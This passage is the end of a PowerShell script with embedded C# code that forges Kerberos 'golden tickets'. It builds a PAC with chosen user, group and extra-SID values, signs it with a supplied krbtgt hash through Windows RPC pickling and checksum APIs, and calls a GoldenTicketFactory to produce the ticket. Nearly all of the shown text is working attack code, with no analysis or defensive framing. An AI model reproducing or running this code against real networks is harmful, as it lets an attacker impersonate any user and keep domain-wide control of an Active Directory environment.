            public int ResourceGroupCount;
            public IntPtr ResourceGroupIds;
        } 
        [StructLayout(LayoutKind.Sequential)]
        struct KERB_SID_AND_ATTRIBUTES {
	        public IntPtr Sid;
	        public int Attributes;
        }
        [StructLayout(LayoutKind.Sequential)]
        struct PAC_INFO_BUFFER
        {
            public int ulType;
            public int cbBufferSize;
            public UInt64 Offset;
        }
        [StructLayout(LayoutKind.Sequential)]
        struct PACTYPE
        {
            public UInt32 cBuffers;
            public UInt32 Version;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public PAC_INFO_BUFFER[] Buffers;
        }
            public byte[] Encode()
            {
                KERB_CHECKSUM pCheckSum;
                IntPtr pCheckSumPtr;
                int status = CDLocateCheckSum(SignatureType, out pCheckSumPtr);
                pCheckSum = (KERB_CHECKSUM) Marshal.PtrToStructure(pCheckSumPtr, typeof(KERB_CHECKSUM));
                if (status != 0)
                {
                    throw new Win32Exception(status, "CDLocateCheckSum failed");
                }
                byte[] logonInfo = ValidationInfoToLogonInfo();
                byte[] clientInfo = ValidationInfoToClientInfo();
                int logonInfoAlignedSize = logonInfo.Length;
                if (logonInfoAlignedSize % 8 != 0)
                    logonInfoAlignedSize += 8 - (logonInfoAlignedSize % 8);
                int clientInfoAlignedSize = clientInfo.Length;
                if (clientInfoAlignedSize % 8 != 0)
                    clientInfoAlignedSize += 8 - (clientInfoAlignedSize % 8);
                int pacTypeSize = Marshal.SizeOf(typeof(PACTYPE));
                int signatureSize = 4 + pCheckSum.Size;
                int signatureSizeAligned = signatureSize;
                if (signatureSizeAligned % 8 != 0)
                    signatureSizeAligned += 8 - (signatureSizeAligned % 8);
                PACTYPE pacType = new PACTYPE();
                pacType.cBuffers = 4;
                pacType.Buffers = new PAC_INFO_BUFFER[4];
                pacType.Buffers[0].cbBufferSize = logonInfo.Length;
                pacType.Buffers[0].ulType = PACINFO_TYPE_LOGON_INFO;
                pacType.Buffers[0].Offset = (ulong)pacTypeSize;
                pacType.Buffers[1].cbBufferSize = clientInfo.Length;
                pacType.Buffers[1].ulType = PACINFO_TYPE_CNAME_TINFO;
                pacType.Buffers[1].Offset = pacType.Buffers[0].Offset + (ulong)logonInfoAlignedSize;
                pacType.Buffers[2].cbBufferSize = signatureSize;
                pacType.Buffers[2].ulType = PACINFO_TYPE_CHECKSUM_SRV;
                pacType.Buffers[2].Offset = pacType.Buffers[1].Offset + (ulong)clientInfoAlignedSize;
                pacType.Buffers[3].cbBufferSize = signatureSize;
                pacType.Buffers[3].ulType = PACINFO_TYPE_CHECKSUM_KDC;
                pacType.Buffers[3].Offset = pacType.Buffers[2].Offset + (ulong)signatureSizeAligned;
                byte[] output = new byte[pacTypeSize + logonInfoAlignedSize + clientInfoAlignedSize + 2 * signatureSizeAligned];
                IntPtr pacTypePtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PACTYPE)));
                Marshal.StructureToPtr(pacType, pacTypePtr, false);
                Marshal.Copy(pacTypePtr, output, 0, Marshal.SizeOf(typeof(PACTYPE)));
                Marshal.FreeHGlobal(pacTypePtr);
                Array.Copy(logonInfo, 0, output, (int)pacType.Buffers[0].Offset, logonInfo.Length);
                Array.Copy(clientInfo, 0, output,  (int)pacType.Buffers[1].Offset, clientInfo.Length);
                byte[] checksumSrv, checksumpKdc;
                Sign(DomainKey, pCheckSum, output, out checksumSrv, out checksumpKdc);
                Array.Copy(BitConverter.GetBytes((int)SignatureType), 0, output, (int)pacType.Buffers[2].Offset, 4);
                Array.Copy(BitConverter.GetBytes((int)SignatureType), 0, output, (int)pacType.Buffers[3].Offset, 4);
                Array.Copy(checksumSrv, 0, output, (int)pacType.Buffers[2].Offset + 4, checksumSrv.Length);
                Array.Copy(checksumpKdc, 0, output, (int)pacType.Buffers[3].Offset + 4, checksumpKdc.Length);
                return output;
            }
            private static void Sign(byte[] key, KERB_CHECKSUM pCheckSum, byte[] pactype, out byte[] checksumSrv, out byte[] checksumpKdc)
            {
                IntPtr Context;
                KERB_CHECKSUM_InitializeEx pCheckSumInitializeEx = (KERB_CHECKSUM_InitializeEx)Marshal.GetDelegateForFunctionPointer(pCheckSum.InitializeEx, typeof(KERB_CHECKSUM_InitializeEx));
                KERB_CHECKSUM_Sum pCheckSumSum = (KERB_CHECKSUM_Sum)Marshal.GetDelegateForFunctionPointer(pCheckSum.Sum, typeof(KERB_CHECKSUM_Sum));
                KERB_CHECKSUM_Finalize pCheckSumFinalize = (KERB_CHECKSUM_Finalize)Marshal.GetDelegateForFunctionPointer(pCheckSum.Finalize, typeof(KERB_CHECKSUM_Finalize));
                KERB_CHECKSUM_Finish pCheckSumFinish = (KERB_CHECKSUM_Finish)Marshal.GetDelegateForFunctionPointer(pCheckSum.Finish, typeof(KERB_CHECKSUM_Finish));
                checksumSrv = new byte[pCheckSum.Size];
                checksumpKdc = new byte[pCheckSum.Size];
                int status = pCheckSumInitializeEx(key, key.Length, KERB_NON_KERB_CKSUM_SALT, out Context);
                if (status != 0)
                    throw new Win32Exception(status);
                pCheckSumSum(Context, pactype.Length, pactype);
                pCheckSumFinalize(Context, checksumSrv);
                pCheckSumFinish(ref Context);
                status = pCheckSumInitializeEx(key, key.Length, KERB_NON_KERB_CKSUM_SALT, out Context);
                if (status != 0)
                    throw new Win32Exception(status);
                pCheckSumSum(Context, pCheckSum.Size, checksumSrv);
                pCheckSumFinalize(Context, checksumpKdc);
                pCheckSumFinish(ref Context);
            }
            private byte[] ValidationInfoToClientInfo()
            {
                byte[] stringBuffer = Encoding.Unicode.GetBytes(UserName);
                byte[] buffer = new byte[sizeof(long) + sizeof(ushort) + stringBuffer.Length];
                byte[] clientID = BitConverter.GetBytes((long)TicketStart.ToFileTimeUtc());
                byte[] NameLength = BitConverter.GetBytes((ushort)stringBuffer.Length);
                Array.Copy(clientID, 0, buffer, 0, clientID.Length);
                Array.Copy(NameLength, 0, buffer, 8, NameLength.Length);
                Array.Copy(stringBuffer, 0, buffer, 10, stringBuffer.Length);
                return buffer;
            }
            [DllImport("Rpcrt4.dll", CharSet = CharSet.Unicode)]
            static extern int MesEncodeIncrementalHandleCreate(
                IntPtr UserState,
                IntPtr AllocFn,
                IntPtr WriteFn,
                out IntPtr pHandle
            );
            [DllImport("Rpcrt4.dll", CharSet = CharSet.Unicode)]
            static extern int MesHandleFree (IntPtr pHandle);
            [DllImport("Rpcrt4.dll", CharSet = CharSet.Unicode)]
            static extern int MesIncrementalHandleReset(
                IntPtr      Handle,
                IntPtr UserState,
                IntPtr AllocFn,
                IntPtr WriteFn,
                IntPtr ReadFn,
                int  OpCode
            );
            [DllImport("Rpcrt4.dll", CharSet = CharSet.Unicode)]
            static extern IntPtr NdrMesTypeAlignSize2(
                IntPtr                        Handle,
                ref MIDL_TYPE_PICKLING_INFO pPicklingInfo,
                IntPtr pStubDesc,
                IntPtr                  pFormatString,
                ref IntPtr pObject 
            );
            [DllImport("Rpcrt4.dll", CharSet = CharSet.Unicode)]
            static extern void NdrMesTypeEncode2(
                IntPtr                        Handle,
                ref MIDL_TYPE_PICKLING_INFO pPicklingInfo,    
                IntPtr           pStubDesc,
                IntPtr pFormatString,
                ref IntPtr pObject 
            );
        [StructLayout(LayoutKind.Sequential)]
        private struct KULL_M_RPC_FCNSTRUCT
        {
	        public IntPtr addr;
            public IntPtr size;
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct MIDL_TYPE_PICKLING_INFO
        {
            int       Version;
            int       Flags;
            IntPtr Reserved1;
            IntPtr Reserved2;
            IntPtr Reserved3;
            public MIDL_TYPE_PICKLING_INFO(int version, int flags)
            {
                Version = version;
                Flags = flags;
                Reserved1 = IntPtr.Zero;
                Reserved2 = IntPtr.Zero;
                Reserved3 = IntPtr.Zero;
            }
        }
        MIDL_TYPE_PICKLING_INFO PicklingInfo = new MIDL_TYPE_PICKLING_INFO(0x33205054, 3);
        private static byte[] MIDL_TypeFormatStringx64 = new byte[] {
                0x00,0x00,0x12,0x00,0x1e,0x00,0x1d,0x00,0x06,0x00,0x01,0x5b,0x15,0x00,0x06,0x00,0x4c,0x00,0xf4,0xff,0x5c,0x5b,0x1b,0x03,0x04,0x00,0x04,0x00,0xf9,0xff,
0x01,0x00,0x08,0x5b,0x17,0x03,0x08,0x00,0xf0,0xff,0x02,0x02,0x4c,0x00,0xe0,0xff,0x5c,0x5b,0x1d,0x00,0x08,0x00,0x02,0x5b,0x15,0x00,0x08,0x00,0x4c,0x00,
0xf4,0xff,0x5c,0x5b,0x1d,0x00,0x10,0x00,0x4c,0x00,0xf0,0xff,0x5c,0x5b,0x15,0x00,0x10,0x00,0x4c,0x00,0xf0,0xff,0x5c,0x5b,0x1a,0x03,0x10,0x00,0x00,0x00,
0x06,0x00,0x36,0x08,0x40,0x5b,0x12,0x00,0xc0,0xff,0x12,0x00,0xee,0xff,0x15,0x03,0x08,0x00,0x08,0x08,0x5c,0x5b,0x12,0x00,0xf6,0xff,0x1c,0x01,0x02,0x00,
0x17,0x55,0x02,0x00,0x01,0x00,0x17,0x55,0x00,0x00,0x01,0x00,0x05,0x5b,0x1a,0x03,0x10,0x00,0x00,0x00,0x08,0x00,0x06,0x06,0x40,0x36,0x5c,0x5b,0x12,0x00,
0xde,0xff,0x1d,0x03,0x08,0x00,0x08,0x5b,0x21,0x03,0x00,0x00,0x19,0x00,0x9c,0x00,0x01,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x4c,0x00,0xb8,0xff,0x5c,0x5b,
0x21,0x03,0x00,0x00,0x19,0x00,0x10,0x01,0x01,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x4c,0x00,0x8e,0xff,0x5c,0x5b,0x21,0x03,0x00,0x00,0x19,0x00,0x28,0x01,
0x01,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x4c,0x00,0x8c,0xff,0x5c,0x5b,0x1a,0x03,0x38,0x01,0x00,0x00,0x60,0x00,0x4c,0x00,0x7e,0xff,0x4c,0x00,0x7a,0xff,
0x4c,0x00,0x76,0xff,0x4c,0x00,0x72,0xff,0x4c,0x00,0x6e,0xff,0x4c,0x00,0x6a,0xff,0x4c,0x00,0x84,0xff,0x4c,0x00,0x80,0xff,0x4c,0x00,0x7c,0xff,0x4c,0x00,
0x78,0xff,0x4c,0x00,0x74,0xff,0x4c,0x00,0x70,0xff,0x06,0x06,0x08,0x08,0x08,0x36,0x08,0x4c,0x00,0x29,0xff,0x40,0x4c,0x00,0x60,0xff,0x4c,0x00,0x5c,0xff,
0x36,0x4c,0x00,0x69,0xff,0x08,0x08,0x4c,0x00,0x33,0xff,0x4c,0x00,0x2f,0xff,0x08,0x08,0x08,0x40,0x36,0x36,0x08,0x40,0x36,0x5c,0x5b,0x12,0x00,0x56,0xff,
0x12,0x00,0xd6,0xfe,0x12,0x00,0x64,0xff,0x12,0x00,0xce,0xfe,0x12,0x00,0x72,0xff,0x12,0x00,0x84,0xff,0x00
        };
        private static byte[] MIDL_TypeFormatStringx86 = new byte[] {
            0x00,0x00,0x12,0x00,0x1e,0x00,0x1d,0x00,0x06,0x00,0x01,0x5b,0x15,0x00,0x06,0x00,0x4c,0x00,0xf4,0xff,0x5c,0x5b,0x1b,0x03,0x04,0x00,0x04,0x00,0xf9,0xff,
0x01,0x00,0x08,0x5b,0x17,0x03,0x08,0x00,0xf0,0xff,0x02,0x02,0x4c,0x00,0xe0,0xff,0x5c,0x5b,0x1d,0x00,0x08,0x00,0x02,0x5b,0x15,0x00,0x08,0x00,0x4c,0x00,
0xf4,0xff,0x5c,0x5b,0x1d,0x00,0x10,0x00,0x4c,0x00,0xf0,0xff,0x5c,0x5b,0x15,0x00,0x10,0x00,0x4c,0x00,0xf0,0xff,0x5c,0x5b,0x16,0x03,0x08,0x00,0x4b,0x5c,
0x46,0x5c,0x00,0x00,0x00,0x00,0x12,0x00,0xc0,0xff,0x5b,0x08,0x08,0x5b,0x12,0x00,0xea,0xff,0x15,0x03,0x08,0x00,0x08,0x08,0x5c,0x5b,0x12,0x00,0xf6,0xff,
0x1d,0x03,0x08,0x00,0x08,0x5b,0x1c,0x01,0x02,0x00,0x17,0x55,0x32,0x00,0x01,0x00,0x17,0x55,0x30,0x00,0x01,0x00,0x05,0x5b,0x1c,0x01,0x02,0x00,0x17,0x55,
0x3a,0x00,0x01,0x00,0x17,0x55,0x38,0x00,0x01,0x00,0x05,0x5b,0x1c,0x01,0x02,0x00,0x17,0x55,0x42,0x00,0x01,0x00,0x17,0x55,0x40,0x00,0x01,0x00,0x05,0x5b,
0x1c,0x01,0x02,0x00,0x17,0x55,0x4a,0x00,0x01,0x00,0x17,0x55,0x48,0x00,0x01,0x00,0x05,0x5b,0x1c,0x01,0x02,0x00,0x17,0x55,0x52,0x00,0x01,0x00,0x17,0x55,
0x50,0x00,0x01,0x00,0x05,0x5b,0x1c,0x01,0x02,0x00,0x17,0x55,0x5a,0x00,0x01,0x00,0x17,0x55,0x58,0x00,0x01,0x00,0x05,0x5b,0x1b,0x03,0x08,0x00,0x19,0x00,
0x6c,0x00,0x01,0x00,0x4c,0x00,0x76,0xff,0x5c,0x5b,0x1c,0x01,0x02,0x00,0x17,0x55,0x8a,0x00,0x01,0x00,0x17,0x55,0x88,0x00,0x01,0x00,0x05,0x5b,0x1c,0x01,
0x02,0x00,0x17,0x55,0x92,0x00,0x01,0x00,0x17,0x55,0x90,0x00,0x01,0x00,0x05,0x5b,0x1b,0x03,0x08,0x00,0x19,0x00,0xc4,0x00,0x01,0x00,0x4b,0x5c,0x48,0x49,
0x08,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x12,0x00,0xea,0xfe,0x5b,0x4c,0x00,0x17,0xff,0x5b,0x1b,0x03,0x08,0x00,0x19,0x00,0xd0,0x00,0x01,0x00,
0x4c,0x00,0x20,0xff,0x5c,0x5b,0x16,0x03,0xd8,0x00,0x4b,0x5c,0x46,0x5c,0x34,0x00,0x34,0x00,0x12,0x00,0x20,0xff,0x46,0x5c,0x3c,0x00,0x3c,0x00,0x12,0x00,
0x28,0xff,0x46,0x5c,0x44,0x00,0x44,0x00,0x12,0x00,0x30,0xff,0x46,0x5c,0x4c,0x00,0x4c,0x00,0x12,0x00,0x38,0xff,0x46,0x5c,0x54,0x00,0x54,0x00,0x12,0x00,
0x40,0xff,0x46,0x5c,0x5c,0x00,0x5c,0x00,0x12,0x00,0x48,0xff,0x46,0x5c,0x70,0x00,0x70,0x00,0x12,0x00,0x50,0xff,0x46,0x5c,0x8c,0x00,0x8c,0x00,0x12,0x00,
0x56,0xff,0x46,0x5c,0x94,0x00,0x94,0x00,0x12,0x00,0x5e,0xff,0x46,0x5c,0x98,0x00,0x98,0x00,0x12,0x00,0x6a,0xfe,0x46,0x5c,0xc8,0x00,0xc8,0x00,0x12,0x00,
0x5c,0xff,0x46,0x5c,0xcc,0x00,0xcc,0x00,0x12,0x00,0x56,0xfe,0x46,0x5c,0xd4,0x00,0xd4,0x00,0x12,0x00,0x6a,0xff,0x5b,0x4c,0x00,0x91,0xfe,0x4c,0x00,0x8d,
0xfe,0x4c,0x00,0x89,0xfe,0x4c,0x00,0x85,0xfe,0x4c,0x00,0x81,0xfe,0x4c,0x00,0x7d,0xfe,0x06,0x06,0x08,0x06,0x06,0x08,0x06,0x06,0x08,0x06,0x06,0x08,0x06,
0x06,0x08,0x06,0x06,0x08,0x06,0x06,0x08,0x08,0x08,0x08,0x08,0x4c,0x00,0x3e,0xfe,0x06,0x06,0x08,0x06,0x06,0x08,0x08,0x4c,0x00,0x61,0xfe,0x08,0x08,0x4c,
0x00,0x4f,0xfe,0x4c,0x00,0x4b,0xfe,0x08,0x08,0x08,0x08,0x08,0x08,0x08,0x5c,0x5b,0x12,0x00,0x22,0xff,0x00
        };
        [StructLayout(LayoutKind.Sequential)]
        private struct RPC_VERSION
        {
            public ushort MajorVersion;
            public ushort MinorVersion;
            public RPC_VERSION(ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
            {
                MajorVersion = InterfaceVersionMajor;
                MinorVersion = InterfaceVersionMinor;
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct RPC_SYNTAX_IDENTIFIER
        {
            public Guid SyntaxGUID;
            public RPC_VERSION SyntaxVersion;
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct RPC_CLIENT_INTERFACE
        {
            public uint Length;
            public RPC_SYNTAX_IDENTIFIER InterfaceId;
            public RPC_SYNTAX_IDENTIFIER TransferSyntax;
            public IntPtr /*PRPC_DISPATCH_TABLE*/ DispatchTable;
            public uint RpcProtseqEndpointCount;
            public IntPtr /*PRPC_PROTSEQ_ENDPOINT*/ RpcProtseqEndpoint;
            public IntPtr Reserved;
            public IntPtr InterpreterInfo;
            public uint Flags;
            public static readonly Guid IID_SYNTAX = new Guid(0x8A885D04u, 0x1CEB, 0x11C9, 0x9F, 0xE8, 0x08, 0x00, 0x2B,
                                                              0x10,
                                                              0x48, 0x60);
            public RPC_CLIENT_INTERFACE(Guid iid, ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
            {
                Length = (uint)Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE));
                RPC_VERSION rpcVersion = new RPC_VERSION(InterfaceVersionMajor, InterfaceVersionMinor);
                InterfaceId = new RPC_SYNTAX_IDENTIFIER();
                InterfaceId.SyntaxGUID = iid;
                InterfaceId.SyntaxVersion = rpcVersion;
                rpcVersion = new RPC_VERSION(2, 0);
                TransferSyntax = new RPC_SYNTAX_IDENTIFIER();
                TransferSyntax.SyntaxGUID = IID_SYNTAX;
                TransferSyntax.SyntaxVersion = rpcVersion;
                DispatchTable = IntPtr.Zero;
                RpcProtseqEndpointCount = 0u;
                RpcProtseqEndpoint = IntPtr.Zero;
                Reserved = IntPtr.Zero;
                InterpreterInfo = IntPtr.Zero;
                Flags = 0u;
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct MIDL_STUB_DESC
        {
            public IntPtr /*RPC_CLIENT_INTERFACE*/ RpcInterfaceInformation;
            public IntPtr pfnAllocate;
            public IntPtr pfnFree;
            public IntPtr pAutoBindHandle;
            public IntPtr /*NDR_RUNDOWN*/ apfnNdrRundownRoutines;
            public IntPtr /*GENERIC_BINDING_ROUTINE_PAIR*/ aGenericBindingRoutinePairs;
            public IntPtr /*EXPR_EVAL*/ apfnExprEval;
            public IntPtr /*XMIT_ROUTINE_QUINTUPLE*/ aXmitQuintuple;
            public IntPtr pFormatTypes;
            public int fCheckBounds;
            /* Ndr library version. */
            public uint Version;
            public IntPtr /*MALLOC_FREE_STRUCT*/ pMallocFreeStruct;
            public int MIDLVersion;
            public IntPtr CommFaultOffsets;
            // New fields for version 3.0+
            public IntPtr /*USER_MARSHAL_ROUTINE_QUADRUPLE*/ aUserMarshalQuadruple;
            // Notify routines - added for NT5, MIDL 5.0
            public IntPtr /*NDR_NOTIFY_ROUTINE*/ NotifyRoutineTable;
            public IntPtr mFlags;
            // International support routines - added for 64bit post NT5
            public IntPtr /*NDR_CS_ROUTINES*/ CsRoutineTables;
            public IntPtr ProxyServerInfo;
            public IntPtr /*NDR_EXPR_DESC*/ pExprInfo;
            // Fields up to now present in win2000 release.
            public MIDL_STUB_DESC(IntPtr pFormatTypesPtr, IntPtr RpcInterfaceInformationPtr,
                                    IntPtr pfnAllocatePtr, IntPtr pfnFreePtr, IntPtr aGenericBindingRoutinePairsPtr)
            {
                pFormatTypes = pFormatTypesPtr;
                RpcInterfaceInformation = RpcInterfaceInformationPtr;
                CommFaultOffsets = IntPtr.Zero;
                pfnAllocate = pfnAllocatePtr;
                pfnFree = pfnFreePtr;
                pAutoBindHandle = IntPtr.Zero;
                apfnNdrRundownRoutines = IntPtr.Zero;
                aGenericBindingRoutinePairs = aGenericBindingRoutinePairsPtr;
                apfnExprEval = IntPtr.Zero;
                aXmitQuintuple = IntPtr.Zero;
                fCheckBounds = 1;
                Version = 0x50002u;
                pMallocFreeStruct = IntPtr.Zero;
                MIDLVersion = 0x8000253;
                aUserMarshalQuadruple = IntPtr.Zero;
                NotifyRoutineTable = IntPtr.Zero;
                mFlags = new IntPtr(0x00000001);
                CsRoutineTables = IntPtr.Zero;
                ProxyServerInfo = IntPtr.Zero;
                pExprInfo = IntPtr.Zero;
            }
        }
        delegate IntPtr allocmemory(int size);
        private static IntPtr AllocateMemory(int size)
        {
            IntPtr memory = Marshal.AllocHGlobal(size);
            return memory;
        }
        delegate void freememory(IntPtr memory);
        private static void FreeMemory(IntPtr memory)
        {
            Marshal.FreeHGlobal(memory);
        }
        delegate void readFcn(IntPtr State, ref IntPtr pBuffer, ref int pSize);
        static void ReadFcn(IntPtr State, ref IntPtr pBuffer, ref int pSize)
        {
            KULL_M_RPC_FCNSTRUCT data = (KULL_M_RPC_FCNSTRUCT) Marshal.PtrToStructure(State, typeof(KULL_M_RPC_FCNSTRUCT));
            pBuffer = data.addr;
            data.addr = new IntPtr(pBuffer.ToInt64() + pSize);
            data.size = new IntPtr(data.size.ToInt64() - pSize);
            Marshal.StructureToPtr(data, State, true);
        }
        delegate void writeFcn(IntPtr State, IntPtr Buffer, int Size);
        static void WriteFcn(IntPtr State, IntPtr Buffer, int Size)
        {
	        
        }
        IntPtr AllocIntPtrFromSID(SecurityIdentifier sid)
        {
            IntPtr sidPtr = Marshal.AllocHGlobal(sid.BinaryLength);
            byte[] temp = new byte[sid.BinaryLength];
            sid.GetBinaryForm(temp, 0);
            Marshal.Copy(temp, 0, sidPtr, sid.BinaryLength);
            return sidPtr;
        }
        KERB_VALIDATION_INFO BuildValidationInfo()
        {
            KERB_VALIDATION_INFO validationInfo = new KERB_VALIDATION_INFO();
            
            
            validationInfo.LogonTime = TicketStart.ToFileTimeUtc();
            validationInfo.LogoffTime = long.MaxValue;
            validationInfo.KickOffTime = long.MaxValue;
            validationInfo.PasswordLastSet = long.MaxValue;
            validationInfo.PasswordCanChange = long.MaxValue;
            validationInfo.PasswordMustChange = long.MaxValue;
            validationInfo.LogonDomainName = new UNICODE_STRING(LogonDomainName);
            validationInfo.EffectiveName = new UNICODE_STRING(UserName);
            validationInfo.LogonDomainId = AllocIntPtrFromSID(DomainSid);
            validationInfo.UserId = UserId;
            validationInfo.UserAccountControl = USER_DONT_EXPIRE_PASSWORD | USER_NORMAL_ACCOUNT;
            if (Groups != null && Groups.Length > 0)
            {
                validationInfo.PrimaryGroupId = Groups[0];
                validationInfo.GroupCount = Groups.Length;
                validationInfo.GroupIds = Marshal.AllocHGlobal(8 * Groups.Length);
                for (int i = 0; i < Groups.Length; i++)
                {
                    Marshal.WriteInt32(validationInfo.GroupIds, 8 * i, Groups[i]);
                    Marshal.WriteInt32(validationInfo.GroupIds, 8 * i + 4, GroupAttributes[i]);
                }
            }
            if (ExtraSids != null && ExtraSids.Length > 0)
            {
                validationInfo.SidCount = ExtraSids.Length;
                validationInfo.UserFlags |= 0x20;
                int size = Marshal.SizeOf(typeof(KERB_SID_AND_ATTRIBUTES));
                validationInfo.ExtraSids = Marshal.AllocHGlobal(size * ExtraSids.Length);
                for(int i = 0; i < ExtraSids.Length; i++)
                {
                    KERB_SID_AND_ATTRIBUTES data = new KERB_SID_AND_ATTRIBUTES();
                    data.Sid = AllocIntPtrFromSID(ExtraSids[i]);
                    data.Attributes = ExtraSidAttributes[i];
                    Marshal.StructureToPtr(data, new IntPtr(validationInfo.ExtraSids.ToInt64() + size * i), true);
                }
            }
            validationInfo.UserSessionKey = new byte[16];
            //if (validationInfo.ResourceGroupDomainSid && validationInfo.ResourceGroupIds && validationInfo.ResourceGroupCount)
            //    validationInfo.UserFlags |= 0x200;
            return validationInfo;
        }
        void FreeValidationInfo(KERB_VALIDATION_INFO validationInfo)
        {
            if (validationInfo.LogonDomainId != IntPtr.Zero)
                Marshal.FreeHGlobal(validationInfo.GroupIds);
            if (validationInfo.GroupIds != IntPtr.Zero)
                Marshal.FreeHGlobal(validationInfo.LogonDomainId);
            if (validationInfo.ExtraSids != IntPtr.Zero)
            {
                int size = Marshal.SizeOf(typeof(KERB_SID_AND_ATTRIBUTES));
                for (int i = 0; i < validationInfo.SidCount; i++)
                {
                    KERB_SID_AND_ATTRIBUTES data = (KERB_SID_AND_ATTRIBUTES) Marshal.PtrToStructure(new IntPtr(validationInfo.ExtraSids.ToInt64() + size * i), typeof(KERB_SID_AND_ATTRIBUTES));
                    Marshal.FreeHGlobal(data.Sid);
                }
                Marshal.FreeHGlobal(validationInfo.ExtraSids);
            }
        }
        private byte[] ValidationInfoToLogonInfo()
        {
            
            int rpcStatus;
            KULL_M_RPC_FCNSTRUCT UserState = new KULL_M_RPC_FCNSTRUCT();
            IntPtr pHandle;
            int offset = (IntPtr.Size == 8 ? 346 : 556);
            byte[] MIDL_TypeFormatString = (IntPtr.Size == 8? MIDL_TypeFormatStringx64 : MIDL_TypeFormatStringx86);
            RPC_CLIENT_INTERFACE clientinterfaceObject = new RPC_CLIENT_INTERFACE(Guid.Empty, 1, 0);
            KERB_VALIDATION_INFO validationInfo = BuildValidationInfo();
            GCHandle clientinterface = GCHandle.Alloc(clientinterfaceObject, GCHandleType.Pinned);
            GCHandle formatString = GCHandle.Alloc(MIDL_TypeFormatString, GCHandleType.Pinned);
            MIDL_STUB_DESC stubObject = new MIDL_STUB_DESC(formatString.AddrOfPinnedObject(),
                                                                clientinterface.AddrOfPinnedObject(),
                                                                Marshal.GetFunctionPointerForDelegate((allocmemory)AllocateMemory),
                                                                Marshal.GetFunctionPointerForDelegate((freememory)FreeMemory),
                                                                IntPtr.Zero);
            
            IntPtr pObject = Marshal.AllocHGlobal(Marshal.SizeOf(validationInfo));
            Marshal.StructureToPtr(validationInfo, pObject, false);
            
            GCHandle stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);
            IntPtr buffer = IntPtr.Zero;
            IntPtr UserStateBuffer = IntPtr.Zero;
            try
            {
                UserStateBuffer = Marshal.AllocHGlobal(Marshal.SizeOf(UserState));
                IntPtr readptr = Marshal.GetFunctionPointerForDelegate((readFcn)ReadFcn);
                IntPtr writeptr = Marshal.GetFunctionPointerForDelegate((writeFcn)WriteFcn);
                rpcStatus = MesEncodeIncrementalHandleCreate(UserStateBuffer, readptr, writeptr, out pHandle);
                if (rpcStatus != 0)
                    throw new Win32Exception(rpcStatus);
                IntPtr size = NdrMesTypeAlignSize2(pHandle, ref PicklingInfo, stub.AddrOfPinnedObject(), Marshal.UnsafeAddrOfPinnedArrayElement(MIDL_TypeFormatString, offset), ref pObject);
                buffer = Marshal.AllocHGlobal(size);
                UserState.addr = buffer;
                UserState.size = size;
                Marshal.StructureToPtr(UserState, UserStateBuffer, true);
                rpcStatus = MesIncrementalHandleReset(pHandle, UserStateBuffer, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0);
                if (rpcStatus != 0)
                    throw new Win32Exception(rpcStatus);
                NdrMesTypeEncode2(pHandle, ref PicklingInfo, stub.AddrOfPinnedObject(), Marshal.UnsafeAddrOfPinnedArrayElement(MIDL_TypeFormatString, offset), ref pObject);
                MesHandleFree(pHandle);
                byte[] output = new byte[size.ToInt64()];
                Marshal.Copy(buffer, output, 0, output.Length);
                return output;
            }
            catch (SEHException ex)
            {
                throw new Win32Exception(ex.ErrorCode);
            }
            finally
            {
                clientinterface.Free();
                stub.Free();
                formatString.Free();
                Marshal.FreeHGlobal(pObject);
                if (buffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(buffer);
                if (UserStateBuffer != IntPtr.Zero)
                    Marshal.FreeHGlobal(UserStateBuffer);
                FreeValidationInfo(validationInfo);
            }
        }
    }
}
"@

#Write-Host "krbtgt hash"
#-join ($krbtgthash|  foreach {$_.ToString("X2") } )

Add-Type -TypeDefinition $sourceGolden

Add-Type -AssemblyName System.DirectoryServices.AccountManagement

if ($domainSid -eq "")
{
    Write-Host "Using current domain SID"
    ([System.DirectoryServices.AccountManagement.UserPrincipal]::Current).SID.AccountDomainSid            
    $domainSid = ([System.DirectoryServices.AccountManagement.UserPrincipal]::Current).SID.AccountDomainSid
}
if ($username -eq "")
{
    Write-Host "Creating ticket for the current user"
    ([System.DirectoryServices.AccountManagement.UserPrincipal]::Current).Name   
    $username = ([System.DirectoryServices.AccountManagement.UserPrincipal]::Current).Name
}
$enc = [system.Text.Encoding]::UTF8
[byte[]]$bytes = $enc.GetBytes($krbtgthash)

$factory =  New-Object  drsrdotnet.GoldenTicketFactory($username, $env:USERDNSDOMAIN, $domainSid, $bytes);

$ticket = $factory.CreateGoldenTicket()

}
